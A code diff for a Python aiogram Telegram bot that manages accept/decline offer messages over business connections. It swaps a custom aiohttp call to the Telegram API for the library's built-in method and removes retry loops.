@@ -1,7 +1,6 @@
 import asyncio
 import random
 import logging
-import aiohttp
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.enums import ParseMode
@@ -16,26 +15,8 @@ dp  = Dispatcher(storage=MemoryStorage())
 
 message_queue  = asyncio.Queue()
 client_user_ids: dict[int, int]   = {}
-_recipients:    dict[str, str]    = {}
-_bcid_store:    dict[str, dict]   = {}
-
-
-async def delete_biz(bcid: str, message_ids: list[int]) -> None:
-    url = f"https://api.telegram.org/bot{TOKEN}/deleteBusinessMessages"
-    for attempt in range(3):
-        async with aiohttp.ClientSession() as s:
-            r = await s.post(url, json={"business_connection_id": bcid, "message_ids": message_ids})
-            data = await r.json()
-            if data.get("ok"):
-                return
-            desc = data.get("description", "")
-            if "retry after" in desc.lower():
-                wait = int(desc.split("retry after")[-1].strip()) + 1
-                logging.warning(f"delete flood, wait {wait}s (attempt {attempt+1})")
-                await asyncio.sleep(wait)
-            else:
-                logging.warning(f"delete_biz failed: {desc}")
-                return
+_recipients:    dict[str, str]    = {}  # bcid -> recipient (без @)
+_bcid_store:    dict[str, dict]   = {}  # "chat_id:msg_id" -> {bcid, chat_id, recipient, lang}
 
 LOCALES = {
     "ru": {
@@ -210,14 +191,7 @@ async def accept_offer(cb: CallbackQuery):
 
     cb_chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-
-    # ищем по message_id по всем записям — chat_id в колбэке может не совпадать с task chat_id
-    stored = None
-    for key, val in _bcid_store.items():
-        if key.endswith(f":{message_id}"):
-            stored = val
-            break
-
+    stored    = _bcid_store.get(f"{cb_chat_id}:{message_id}")
     bcid      = stored["bcid"]      if stored else None
     chat_id   = stored["chat_id"]   if stored else cb_chat_id
     recipient = stored["recipient"] if stored else "recipient_username"
@@ -225,24 +199,17 @@ async def accept_offer(cb: CallbackQuery):
 
     await cb.answer("✅ Успешно принято!", show_alert=True)
 
-    for attempt in range(3):
-        try:
-            await bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=make_accept_keyboard(lang, recipient),
-                business_connection_id=bcid,
-            )
-            break
-        except TelegramRetryAfter as e:
-            wait = e.retry_after + 1
-            logging.warning(f"edit flood, wait {wait}s (attempt {attempt+1})")
-            await asyncio.sleep(wait)
-        except Exception as e:
-            logging.error(f"accept edit error: {e}")
-            break
+    try:
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=make_accept_keyboard(lang, recipient),
+            business_connection_id=bcid,
+        )
+    except Exception as e:
+        logging.error(f"accept edit error: {e}")
 
 
 @dp.callback_query(F.data.startswith("d|"))
@@ -253,7 +220,10 @@ async def decline_offer(cb: CallbackQuery):
     bcid       = stored["bcid"]    if stored else cb.message.business_connection_id
     chat_id    = stored["chat_id"] if stored else cb_chat_id
     try:
-        await delete_biz(bcid, [message_id])
+        await bot.delete_business_messages(
+            business_connection_id=bcid,
+            message_ids=[message_id],
+        )
     except Exception:
         pass
     await cb.answer("Предложение отклонено")
@@ -289,7 +259,10 @@ async def sender_worker():
                     "recipient": task["recipient"],
                     "lang":      task["lang"],
                 }
-                await delete_biz(task["bcid"], [task["cmd_message_id"]])
+                await bot.delete_business_messages(
+                    business_connection_id=task["bcid"],
+                    message_ids=[task["cmd_message_id"]],
+                )
 
         except TelegramRetryAfter as e:
             wait_time = e.retry_after + 1
